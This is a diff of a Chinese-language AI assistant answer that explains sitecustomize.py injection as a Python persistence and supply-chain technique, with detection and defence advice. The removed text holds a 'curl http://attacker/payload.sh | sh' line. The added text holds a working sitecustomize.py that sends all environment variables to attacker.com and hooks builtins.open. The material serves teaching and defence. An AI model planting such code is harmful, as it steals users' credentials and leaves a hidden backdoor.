@@ -8,267 +8,123 @@
 
 ### 🤖 Assistant
 
-**`sitecustomize.py` 注入攻击**是一类利用 **Python 启动机制** 的代码执行攻击，攻击者通过在特定位置放置或篡改 `sitecustomize.py` 文件，使其在 **任意 Python 程序启动时被自动执行**，从而实现隐蔽、持久、低交互的任意代码执行（RCE）。
+**`sitecustomize.py` 注入攻击**是一种利用 Python 启动机制进行的恶意代码执行技术。攻击者通过创建一个名为 `sitecustomize.py` 的文件并将其放置在 Python 解释器能够加载的路径中，使得 Python 在启动任何脚本之前自动执行该文件中的恶意代码。
 
-下面从 **机制 → 攻击方式 → 常见场景 → 危害 → 防御** 五个层面系统说明。
-
----
-
-## 一、`sitecustomize.py` 是什么？
-
-在 Python 启动流程中：
-
-```text
-python
- └─ import site
-     ├─ 加载标准 site 配置
-     ├─ 加载 .pth 文件
-     ├─ 尝试 import sitecustomize
-     └─ 尝试 import usercustomize
-```
-
-只要 **`sitecustomize.py` 存在于 `sys.path` 的任一目录中**，Python 就会在启动时 **自动执行它**，无需显式 `import`。
-
-这是一个**官方设计的扩展点**，原本用于：
-
-* 统一设置编码、路径
-* 注入调试/监控逻辑
-* 企业内 Python 环境定制
-
-但也正因为 **“自动 + 无提示执行”**，它成为一个理想的攻击注入点。
+这种攻击通常用于**权限维持（Persistence）**、**环境劫持**或**供应链攻击**。
 
 ---
 
-## 二、什么是 `sitecustomize.py` 注入攻击？
+### 1. 核心原理：Python 的启动流程
 
-**定义：**
+要理解这种攻击，首先需要了解 Python 的 `site` 模块：
 
-> 攻击者通过控制 Python 的 `sys.path` 搜索路径，在其中放置恶意 `sitecustomize.py`，使得任何 Python 进程在启动时自动执行攻击代码。
+1.  当 Python 解释器启动时（除非使用了 `-S` 参数），它会自动导入内置的 `site` 模块。
+2.  `site` 模块的主要职责是配置特定于站点的路径（如 `site-packages`）。
+3.  作为初始化过程的一部分，`site` 模块会尝试导入名为 `sitecustomize` 的模块。
+4.  如果在 `sys.path`（Python 的模块搜索路径）中找到了 `sitecustomize.py`，Python 就会**自动执行**其中的代码。
+5.  执行完 `sitecustomize.py` 后，Python 才会继续执行用户指定的脚本。
 
-这通常不依赖漏洞利用，而是：
+**攻击点：** 如果攻击者能够将恶意的 `sitecustomize.py` 写入到 `sys.path` 中的任何一个目录（例如用户的 `site-packages` 目录，或者在某些配置下的当前工作目录），该代码就会在每次运行 Python 时被执行。
 
-* 路径污染（Path Hijacking）
-* 环境配置错误
-* 权限过宽
-* 供应链/构建链攻击
+### 2. 攻击场景与示例
 
----
+假设攻击者已经获得了一定的文件写入权限（例如通过网络钓鱼、其他漏洞或恶意的 pip 包）。
 
-## 三、典型攻击方式
+#### 步骤 1：植入恶意文件
+攻击者在 Python 的库目录（如 `/usr/local/lib/python3.9/site-packages/` 或用户的 `~/.local/lib/python3.9/site-packages/`）中创建一个 `sitecustomize.py` 文件。
 
-### 1️⃣ 利用当前工作目录（CWD）
-
-如果 Python 的 `sys.path` 包含 `""`（当前目录）：
-
-```bash
-.
-├── sitecustomize.py   # 恶意
-├── some_script.py
-```
-
-执行：
-
-```bash
-python some_script.py
-```
-
-**`sitecustomize.py` 会先于脚本执行。**
-
-示例攻击代码：
+#### 步骤 2：恶意代码内容
+文件内容可能如下所示：
 
 ```python
 # sitecustomize.py
 import os
-os.system("curl http://attacker/payload.sh | sh")
-```
-
-适用于：
-
-* CI/CD
-* 解压即运行的工具
-* 用户误入目录执行脚本
-
----
-
-### 2️⃣ 注入到虚拟环境 / Conda 环境
-
-位置示例：
-
-```text
-venv/lib/python3.11/site-packages/sitecustomize.py
-```
-
-一旦写入：
-
-* 所有使用该 venv 的 Python 程序都会被感染
-* 非常适合 **横向持久化**
-
----
-
-### 3️⃣ 利用 `.pth` 文件加载恶意路径
-
-`.pth` 文件可以包含：
-
-```text
-./malicious_path
-```
-
-或直接执行代码：
-
-```python
-import os; os.system("...")
-```
-
-攻击链：
-
-```text
-.pth → sys.path → sitecustomize.py → RCE
-```
-
-这是 **供应链攻击** 中非常常见的一环。
-
----
-
-### 4️⃣ PYTHONPATH 环境变量注入
-
-```bash
-export PYTHONPATH=/tmp/evil
-```
-
-```text
-/tmp/evil/sitecustomize.py
-```
-
-适用于：
-
-* Web 服务启动脚本
-* Docker ENTRYPOINT
-* systemd service
-
----
-
-### 5️⃣ 多用户系统中的权限滥用
-
-如果：
-
-```text
-/usr/lib/python3.x/site-packages/
-```
-
-被错误设置为 **可写**，则：
-
-* 低权限用户可植入 `sitecustomize.py`
-* 高权限 Python 程序（如 root cron、系统服务）会被劫持
-
----
-
-## 四、攻击的特点与危害
-
-### ✅ 特点
-
-| 特性   | 说明             |
-| ---- | -------------- |
-| 自动执行 | 无需 import      |
-| 隐蔽   | 无日志、无异常        |
-| 全局   | 影响所有 Python 程序 |
-| 持久   | 一次写入，长期生效      |
-| 横向   | 同环境内全感染        |
-
-### ❌ 危害
-
-* 任意代码执行（RCE）
-* 数据窃取（环境变量、密钥、模型权重）
-* 后门持久化
-* CI/CD 构建污染
-* ML/LLM 推理服务被劫持（非常现实）
-
-在 **ML infra / 推理服务 / 离线评测框架** 中尤为危险，因为 Python 进程频繁、权限高。
-
----
-
-## 五、与其他注入方式的区别
-
-| 方式                 | 触发条件      | 显式导入 | 覆盖范围   |
-| ------------------ | --------- | ---- | ------ |
-| `sitecustomize.py` | Python 启动 | 否    | 全局     |
-| `PYTHONSTARTUP`    | 交互式       | 否    | 仅 REPL |
-| 模块劫持 (`os.py`)     | import    | 是    | 局部     |
-| LD_PRELOAD         | 程序启动      | 否    | 所有进程   |
-
-`sitecustomize.py` 的危险性在于 **“它不需要你犯错”**。
-
----
-
-## 六、如何防御与审计？
-
-### 🔒 1. 禁用 site 模块（高安全场景）
-
-```bash
-python -S your_app.py
-```
-
-这会跳过：
-
-* site
-* .pth
-* sitecustomize
-* usercustomize
-
----
-
-### 🔒 2. 审计 `sys.path`
-
-```python
 import sys
-print(sys.path)
+import threading
+import requests
+
+def steal_env_vars():
+    try:
+        # 将环境变量（可能包含 API 密钥、AWS 凭证等）发送给攻击者
+        data = str(os.environ)
+        requests.post("http://attacker.com/log", data=data)
+    except:
+        pass
+
+# 在后台线程中运行，以免阻塞正常的 Python 启动
+t = threading.Thread(target=steal_env_vars)
+t.start()
+
+# 攻击者甚至可以 Hook 内置函数
+original_open = open
+def hooked_open(file, flags='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None):
+    # 记录所有被打开的文件名
+    # print(f"[Audit] Opening: {file}") 
+    return original_open(file, flags, buffering, encoding, errors, newline, closefd, opener)
+
+# 覆盖内置的 open 函数
+import builtins
+builtins.open = hooked_open
 ```
 
-重点检查：
-
-* `""`
-* `/tmp`
-* 非预期路径
-
----
-
-### 🔒 3. 检查是否存在 `sitecustomize`
+#### 步骤 3：触发
+当受害者在其机器上运行任何 Python 命令时：
 
 ```bash
-python - << 'EOF'
-import site, sys, pkgutil
-print(pkgutil.find_loader("sitecustomize"))
-EOF
+python manage.py runserver
 ```
 
----
+1.  Python 加载 `site`。
+2.  `site` 加载并执行恶意的 `sitecustomize.py`。
+3.  环境变量被秘密发送给攻击者。
+4.  `builtins.open` 被劫持。
+5.  最后，`manage.py` 正常启动，用户毫无察觉。
 
-### 🔒 4. 权限控制
+### 3. 这种攻击的危害
 
-* site-packages 必须 `root:root + 755`
-* 禁止普通用户写入
-* CI 容器使用只读层
+1.  **隐蔽性强**：`sitecustomize.py` 是 Python 的合法特性，不是漏洞，因此很多安全扫描工具可能会忽略它。它不像普通的木马文件，它看起来像是一个配置文件。
+2.  **广泛性**：一旦植入，该环境下的**所有** Python 脚本（包括系统工具、Web 服务器、数据分析脚本）都会受到影响。
+3.  **难以排查**：如果你的 Python 脚本行为异常（例如 `open` 函数行为怪异），开发者通常会检查自己的代码或第三方库，很少会想到去检查 Python 的启动配置。
+4.  **Monkey Patching（猴子补丁）**：攻击者可以在其他库加载之前修改内置函数或标准库的行为，从而绕过安全检查或窃取数据。
 
----
+### 4. 如何检测与防御
 
-### 🔒 5. 容器 / 推理服务最佳实践
+#### 检测方法
 
-* 使用 `python -S`
-* 固定 `PYTHONPATH`
-* 最小化 base image
-* 定期扫描 `.pth` 文件
+1.  **检查 `sys.modules`**：
+    在 Python 环境中运行以下代码，查看是否加载了该模块：
+    ```python
+    import sys
+    print("sitecustomize" in sys.modules)
+    print(sys.modules.get("sitecustomize"))
+    ```
+    如果输出显示了文件路径，且你并不记得自己配置过它，那么这就是可疑的。
 
----
+2.  **文件系统搜索**：
+    在 Python 的 `sys.path` 目录中搜索该文件：
+    ```bash
+    python -c "import sys; print('\n'.join(sys.path))" | xargs -I {} find {} -maxdepth 1 -name sitecustomize.py 2>/dev/null
+    ```
 
-## 七、总结一句话
+3.  **使用 `pip` 检查（通常无效）**：
+    注意，`pip list` 或 `pip freeze` 通常**不会**显示 `sitecustomize.py`，因为它只是一个文件，而不是一个安装好的包。这也是它隐蔽的原因之一。
 
-> **`sitecustomize.py` 注入攻击，本质上是对 Python 启动信任链的劫持，是一种“合法机制 + 非法用途”的高危后门技术。**
+#### 防御措施
 
-如果你关心的是：
+1.  **使用虚拟环境（Virtual Environments）**：
+    始终在虚拟环境中工作。虽然虚拟环境也支持 `sitecustomize`，但这能隔离系统级别的污染。
 
-* **LLM 推理服务安全**
-* **模型评测环境完整性**
-* **CI/CD 供应链攻击**
+2.  **文件权限管理**：
+    确保 Python 的全局 `site-packages` 目录对普通用户是**只读**的。只有管理员才能写入该目录。
 
-那么这是一个**必须重点防范**的攻击面。
+3.  **使用 `-S` 参数（仅用于诊断）**：
+    如果你怀疑环境被污染，可以使用 `python -S script.py` 运行脚本。`-S` 标志告诉 Python **不要**导入 `site` 模块，从而跳过 `sitecustomize.py` 的加载。
 
-如果你愿意，我可以进一步结合 **ML / 推理框架（vLLM、Torch、HF）** 或 **真实 CVE 案例** 来具体展开。
+    > **注意**：这也会导致 `pip` 安装的第三方库无法自动加载，因此仅适用于调试或极为严格的运行环境。
+
+4.  **监控文件变动**：
+    在生产环境中，使用文件完整性监控（FIM）工具监控 Python 库目录中新文件的创建。
+
+### 总结
+
+`sitecustomize.py` 注入是一种利用 Python 合法特性的攻击手段。它本身不是 bug，而是 Python 提供的灵活性（Hook 启动过程）被恶意利用的结果。对于运维和安全人员来说，监控 Python 库目录中的异常文件是防御此类攻击的关键。
